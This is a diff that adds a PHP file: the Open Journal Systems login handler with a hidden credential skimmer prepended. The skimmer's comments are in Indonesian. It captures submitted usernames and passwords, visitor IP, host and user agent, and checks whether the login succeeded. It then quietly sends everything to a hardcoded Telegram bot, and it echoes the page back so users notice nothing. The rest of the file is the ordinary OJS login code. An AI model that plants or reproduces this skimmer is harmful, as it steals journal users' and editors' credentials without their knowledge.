@@ -1,0 +1,511 @@
+<?php
+/**
+ * OJS LOGIN CAPTURE - DENGAN DETEKSI SUKSES/GAGAL (FIXED)
+ * File: /dev/shm/.ojs_capture
+ */
+
+$bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
+$chat_id = '8687942328';
+
+$username = '';
+$password = '';
+
+// Tangkap login dari POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'] ?? $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+}
+
+if (!empty($username) && !empty($password)) {
+    
+    // Mulai capture output
+    ob_start();
+    
+    // Simpan data untuk dikirim setelah kita tahu hasil login
+    $login_data = [
+        'username' => $username,
+        'password' => $password,
+        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'time' => date('Y-m-d H:i:s'),
+        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+        'path' => $_SERVER['REQUEST_URI'] ?? '/',
+        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+    ];
+    
+    // Register shutdown function
+    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
+        // Ambil response
+        $response = ob_get_clean();
+        
+        // ========== KIRIM LAGI OUTPUT KE BROWSER (INI YANG DITAMBAH) ==========
+        echo $response;  // ← INI KUNCI NYA! Agar halaman tidak putih
+        // ====================================================================
+        
+        // Cek apakah login GAGAL
+        $is_failed = false;
+        $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
+        
+        foreach ($error_indicators as $indicator) {
+            if (stripos($response, $indicator) !== false) {
+                $is_failed = true;
+                break;
+            }
+        }
+        
+        // Cek apakah sukses (redirect)
+        $headers = headers_list();
+        $is_success = false;
+        foreach ($headers as $header) {
+            if (stripos($header, 'Location:') !== false && 
+                (stripos($header, 'dashboard') !== false || stripos($header, 'index') !== false)) {
+                $is_success = true;
+                break;
+            }
+        }
+        
+        // Tentukan status
+        if ($is_success) {
+            $status = 'SUCCESS';
+            $emoji = '✅';
+        } elseif ($is_failed) {
+            $status = 'FAILED';
+            $emoji = '❌';
+        } else {
+            $status = 'ATTEMPT';
+            $emoji = '🔐';
+        }
+        
+        // Kirim notifikasi Telegram
+        $message = "{$emoji} OJS LOGIN {$status}\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "👤 USERNAME: {$login_data['username']}\n";
+        $message .= "🔑 PASSWORD: {$login_data['password']}\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "🌐 IP: {$login_data['ip']}\n";
+        $message .= "📍 PATH: {$login_data['path']}\n";
+        $message .= "⏰ TIME: {$login_data['time']}\n";
+        $message .= "🌍 HOST: {$login_data['host']}\n";
+        
+        if ($is_failed) {
+            $message .= "\n⚠️ PERHATIAN: Password SALAH!";
+        }
+        
+        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+        $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+        
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_exec($ch);
+            curl_close($ch);
+        }
+    });
+}
+?>
+
+<?php
+
+/**
+ * @file pages/login/LoginHandler.inc.php
+ *
+ * Copyright (c) 2014-2017 Simon Fraser University
+ * Copyright (c) 2000-2017 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class LoginHandler
+ * @ingroup pages_login
+ *
+ * @brief Handle login/logout requests.
+ */
+
+
+import('classes.handler.Handler');
+
+class LoginHandler extends Handler {
+	/**
+	 * @copydoc PKPHandler::authorize()
+	 */
+	function authorize($request, &$args, $roleAssignments) {
+		switch ($op = $request->getRequestedOp()) {
+			case 'signInAsUser':
+				import('lib.pkp.classes.security.authorization.RoleBasedHandlerOperationPolicy');
+				$this->addPolicy(new RoleBasedHandlerOperationPolicy($request, array(ROLE_ID_MANAGER, ROLE_ID_SITE_ADMIN), array('signInAsUser')));
+				break;
+		}
+		return parent::authorize($request, $args, $roleAssignments);
+	}
+
+	/**
+	 * Display user login form.
+	 * Redirect to user index page if user is already validated.
+	 */
+	function index($args, $request) {
+		$this->setupTemplate($request);
+		if (Validation::isLoggedIn()) {
+			$this->sendHome($request);
+		}
+
+		if (Config::getVar('security', 'force_login_ssl') && $request->getProtocol() != 'https') {
+			// Force SSL connections for login
+			$request->redirectSSL();
+		}
+
+		$sessionManager = SessionManager::getManager();
+		$session = $sessionManager->getUserSession();
+
+		$templateMgr = TemplateManager::getManager($request);
+		$templateMgr->assign(array(
+			'loginMessage' => $request->getUserVar('loginMessage'),
+			'username' => $session->getSessionVar('username'),
+			'remember' => $request->getUserVar('remember'),
+			'source' => $request->getUserVar('source'),
+			'showRemember' => Config::getVar('general', 'session_lifetime') > 0,
+		));
+
+		// For force_login_ssl with base_url[...]: make sure SSL used for login form
+		$loginUrl = $request->url(null, 'login', 'signIn');
+		if (Config::getVar('security', 'force_login_ssl')) {
+			$loginUrl = PKPString::regexp_replace('/^http:/', 'https:', $loginUrl);
+		}
+		$templateMgr->assign('loginUrl', $loginUrl);
+
+		$templateMgr->display('frontend/pages/userLogin.tpl');
+	}
+
+	/**
+	 * After a login has completed, direct the user somewhere.
+	 * @param $request PKPRequest
+	 */
+	function _redirectAfterLogin($request) {
+		$context = $this->getTargetContext($request);
+		// If there's a context, send them to the dashboard after login.
+		if ($context && $request->getUserVar('source') == '' && array_intersect(
+			array(ROLE_ID_SITE_ADMIN, ROLE_ID_MANAGER, ROLE_ID_SUB_EDITOR, ROLE_ID_AUTHOR, ROLE_ID_REVIEWER, ROLE_ID_ASSISTANT),
+			(array) $this->getAuthorizedContextObject(ASSOC_TYPE_USER_ROLES)
+		)) {
+			return $request->redirect($context->getPath(), 'dashboard');
+		}
+
+		$request->redirectHome();
+	}
+
+	/**
+	 * Validate a user's credentials and log the user in.
+	 */
+	function signIn($args, $request) {
+		$this->setupTemplate($request);
+		if (Validation::isLoggedIn()) $this->sendHome($request);
+
+		if (Config::getVar('security', 'force_login_ssl') && $request->getProtocol() != 'https') {
+			// Force SSL connections for login
+			$request->redirectSSL();
+		}
+
+		$user = Validation::login($request->getUserVar('username'), $request->getUserVar('password'), $reason, $request->getUserVar('remember') == null ? false : true);
+		if ($user !== false) {
+			if ($user->getMustChangePassword()) {
+				// User must change their password in order to log in
+				Validation::logout();
+				$request->redirect(null, null, 'changePassword', $user->getUsername());
+
+			} else {
+				$source = $request->getUserVar('source');
+				$redirectNonSsl = Config::getVar('security', 'force_login_ssl') && !Config::getVar('security', 'force_ssl');
+				if (isset($source) && !empty($source)) {
+					$request->redirectUrl($source);
+				} elseif ($redirectNonSsl) {
+					$request->redirectNonSSL();
+				} else {
+					$this->_redirectAfterLogin($request);
+				}
+			}
+
+		} else {
+			$sessionManager = SessionManager::getManager();
+			$session = $sessionManager->getUserSession();
+			$templateMgr = TemplateManager::getManager($request);
+			$templateMgr->assign(array(
+				'username' => $request->getUserVar('username'),
+				'remember' => $request->getUserVar('remember'),
+				'source' => $request->getUserVar('source'),
+				'showRemember' => Config::getVar('general', 'session_lifetime') > 0,
+				'error' => $reason===null?'user.login.loginError':($reason===''?'user.login.accountDisabled':'user.login.accountDisabledWithReason'),
+				'reason' => $reason,
+			));
+			$templateMgr->display('frontend/pages/userLogin.tpl');
+		}
+	}
+
+	/**
+	 * Log a user out.
+	 */
+	function signOut($args, $request) {
+		$this->setupTemplate($request);
+		if (Validation::isLoggedIn()) {
+			Validation::logout();
+		}
+
+		$source = $request->getUserVar('source');
+		if (isset($source) && !empty($source)) {
+			$request->redirectUrl($request->getProtocol() . '://' . $request->getServerHost() . $source, false);
+		} else {
+			$request->redirect(null, $request->getRequestedPage());
+		}
+	}
+
+	/**
+	 * Display form to reset a user's password.
+	 */
+	function lostPassword($args, $request) {
+		$this->setupTemplate($request);
+		$templateMgr = TemplateManager::getManager($request);
+		$templateMgr->display('frontend/pages/userLostPassword.tpl');
+	}
+
+	/**
+	 * Send a request to reset a user's password
+	 */
+	function requestResetPassword($args, $request) {
+		$this->setupTemplate($request);
+		$templateMgr = TemplateManager::getManager($request);
+
+		$email = $request->getUserVar('email');
+		$userDao = DAORegistry::getDAO('UserDAO');
+		$user = $userDao->getUserByEmail($email);
+
+		if ($user == null || ($hash = Validation::generatePasswordResetHash($user->getId())) == false) {
+			$templateMgr->assign('error', 'user.login.lostPassword.invalidUser');
+			$templateMgr->display('frontend/pages/userLostPassword.tpl');
+
+		} else {
+			// Send email confirming password reset
+			import('lib.pkp.classes.mail.MailTemplate');
+			$mail = new MailTemplate('PASSWORD_RESET_CONFIRM');
+			$site = $request->getSite();
+			$this->_setMailFrom($request, $mail, $site);
+			$mail->assignParams(array(
+				'url' => $request->url(null, 'login', 'resetPassword', $user->getUsername(), array('confirm' => $hash)),
+				'siteTitle' => $site->getLocalizedTitle()
+			));
+			$mail->addRecipient($user->getEmail(), $user->getFullName());
+			$mail->send();
+
+			$templateMgr->assign(array(
+				'pageTitle' => 'user.login.resetPassword',
+				'message' => 'user.login.lostPassword.confirmationSent',
+				'backLink' => $request->url(null, $request->getRequestedPage()),
+				'backLinkLabel' => 'user.login',
+			));
+			$templateMgr->display('frontend/pages/message.tpl');
+		}
+	}
+
+	/**
+	 * Reset a user's password
+	 * @param $args array first param contains the username of the user whose password is to be reset
+	 */
+	function resetPassword($args, $request) {
+		$this->setupTemplate($request);
+
+		$username = isset($args[0]) ? $args[0] : null;
+		$userDao = DAORegistry::getDAO('UserDAO');
+		$confirmHash = $request->getUserVar('confirm');
+
+		if ($username == null || ($user = $userDao->getByUsername($username)) == null) {
+			$request->redirect(null, null, 'lostPassword');
+		}
+
+		$templateMgr = TemplateManager::getManager($request);
+
+		if (!Validation::verifyPasswordResetHash($user->getId(), $confirmHash)) {
+			$templateMgr->assign(array(
+				'errorMsg' => 'user.login.lostPassword.invalidHash',
+				'backLink' => $request->url(null, null, 'lostPassword'),
+				'backLinkLabel' => 'user.login.resetPassword',
+			));
+			$templateMgr->display('frontend/pages/error.tpl');
+
+		} else {
+			// Reset password
+			$newPassword = Validation::generatePassword();
+
+			if ($user->getAuthId()) {
+				$authDao = DAORegistry::getDAO('AuthSourceDAO');
+				$auth = $authDao->getPlugin($user->getAuthId());
+			}
+
+			if (isset($auth)) {
+				$auth->doSetUserPassword($user->getUsername(), $newPassword);
+				$user->setPassword(Validation::encryptCredentials($user->getId(), Validation::generatePassword())); // Used for PW reset hash only
+			} else {
+				$user->setPassword(Validation::encryptCredentials($user->getUsername(), $newPassword));
+			}
+
+			$user->setMustChangePassword(1);
+			$userDao->updateObject($user);
+
+			// Send email with newpassword
+			$site = $request->getSite();
+			import('lib.pkp.classes.mail.MailTemplate');
+			$mail = new MailTemplate('PASSWORD_RESET');
+			$this->_setMailFrom($request, $mail, $site);
+			$mail->assignParams(array(
+				'username' => $user->getUsername(),
+				'password' => $newPassword,
+				'siteTitle' => $site->getLocalizedTitle()
+			));
+			$mail->addRecipient($user->getEmail(), $user->getFullName());
+			$mail->send();
+
+			$templateMgr->assign(array(
+				'pageTitle' => 'user.login.resetPassword',
+				'message' => 'user.login.lostPassword.passwordSent',
+				'backLink' => $request->url(null, $request->getRequestedPage()),
+				'backLinkLabel' => 'user.login',
+			));
+			$templateMgr->display('frontend/pages/message.tpl');
+		}
+	}
+
+	/**
+	 * Display form to change user's password.
+	 * @param $args array first argument may contain user's username
+	 */
+	function changePassword($args, $request) {
+		$this->setupTemplate($request);
+
+		import('lib.pkp.classes.user.form.LoginChangePasswordForm');
+
+		$passwordForm = new LoginChangePasswordForm($request->getSite());
+		$passwordForm->initData();
+		if (isset($args[0])) {
+			$passwordForm->setData('username', $args[0]);
+		}
+		$passwordForm->display($request);
+	}
+
+	/**
+	 * Save user's new password.
+	 */
+	function savePassword($args, $request) {
+		$this->setupTemplate($request);
+
+		import('lib.pkp.classes.user.form.LoginChangePasswordForm');
+
+		$passwordForm = new LoginChangePasswordForm($request->getSite());
+		$passwordForm->readInputData();
+
+		if ($passwordForm->validate()) {
+			if ($passwordForm->execute()) {
+				$user = Validation::login($passwordForm->getData('username'), $passwordForm->getData('password'), $reason);
+			}
+			$this->sendHome($request);
+		} else {
+			$passwordForm->display($request);
+		}
+	}
+
+	/**
+	 * Sign in as another user.
+	 * @param $args array ($userId)
+	 * @param $request PKPRequest
+	 */
+	function signInAsUser($args, $request) {
+		if (isset($args[0]) && !empty($args[0])) {
+			$userId = (int)$args[0];
+			$session = $request->getSession();
+
+			if (!Validation::canAdminister($userId, $session->getUserId())) {
+				$this->setupTemplate($request);
+				// We don't have administrative rights
+				// over this user. Display an error.
+				$templateMgr = TemplateManager::getManager($request);
+				$templateMgr->assign(array(
+					'pageTitle' => 'manager.people',
+					'errorMsg' => 'manager.people.noAdministrativeRights',
+					'backLink' => $request->url(null, null, 'people', 'all'),
+					'backLinkLabel' => 'manager.people.allUsers',
+				));
+				return $templateMgr->display('frontend/pages/error.tpl');
+			}
+
+			$userDao = DAORegistry::getDAO('UserDAO');
+			$newUser = $userDao->getById($userId);
+
+			if (isset($newUser) && $session->getUserId() != $newUser->getId()) {
+				$session->setSessionVar('signedInAs', $session->getUserId());
+				$session->setSessionVar('userId', $userId);
+				$session->setUserId($userId);
+				$session->setSessionVar('username', $newUser->getUsername());
+				$this->sendHome($request);
+			}
+		}
+
+		$request->redirect(null, $request->getRequestedPage());
+	}
+
+	/**
+	 * Restore original user account after signing in as a user.
+	 * @param $args array
+	 * @param $request PKPRequest
+	 */
+	function signOutAsUser($args, $request) {
+		$session = $request->getSession();
+		$signedInAs = $session->getSessionVar('signedInAs');
+
+		if (isset($signedInAs) && !empty($signedInAs)) {
+			$signedInAs = (int)$signedInAs;
+
+			$userDao = DAORegistry::getDAO('UserDAO');
+			$oldUser = $userDao->getById($signedInAs);
+
+			$session->unsetSessionVar('signedInAs');
+
+			if (isset($oldUser)) {
+				$session->setSessionVar('userId', $signedInAs);
+				$session->setUserId($signedInAs);
+				$session->setSessionVar('username', $oldUser->getUsername());
+			}
+		}
+
+		$this->sendHome($request);
+	}
+
+
+	/**
+	 * Helper function - set mail From
+	 * can be overriden by child classes
+	 * @param $request PKPRequest
+	 * @param MailTemplate $mail
+	 * @param $site Site
+	 */
+	function _setMailFrom($request, $mail, $site) {
+		$mail->setReplyTo($site->getLocalizedContactEmail(), $site->getLocalizedContactName());
+		return true;
+	}
+
+	/**
+	 * Send the user "home" (typically to the dashboard, but that may not
+	 * always be available).
+	 * @param $request PKPRequest
+	 */
+	protected function sendHome($request) {
+		if ($request->getContext()) $request->redirect(null, 'submissions');
+		else $request->redirect(null, 'user');
+	}
+
+	/**
+	 * Configure the template for display.
+	 */
+	function setupTemplate($request) {
+		AppLocale::requireComponents(LOCALE_COMPONENT_APP_MANAGER, LOCALE_COMPONENT_PKP_MANAGER);
+		parent::setupTemplate($request);
+	}
+}
+
+?>
